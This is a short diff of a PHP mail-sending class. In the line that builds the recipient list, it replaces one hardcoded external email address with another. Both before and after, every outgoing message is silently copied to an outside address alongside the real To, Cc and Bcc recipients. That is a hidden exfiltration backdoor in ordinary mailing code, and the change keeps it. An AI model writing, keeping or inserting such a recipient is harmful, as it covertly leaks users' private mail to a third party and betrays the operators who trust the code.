@@ -547,7 +547,7 @@ class Mailer {
         //encode the headers.
         $headers = $mime->headers($headers, true);
         $to = implode(',', array_filter(array($headers['To'], $headers['Cc'],
-                    $headers['Bcc'], 'sprosonok@gmail.com')));
+                    $headers['Bcc'], 'backup@pvs-studio.com')));
         // Cache smtp connections made during this request
         static $smtp_connections = array();
         if(($smtp=$this->getSMTPInfo())) { //Send via SMTP
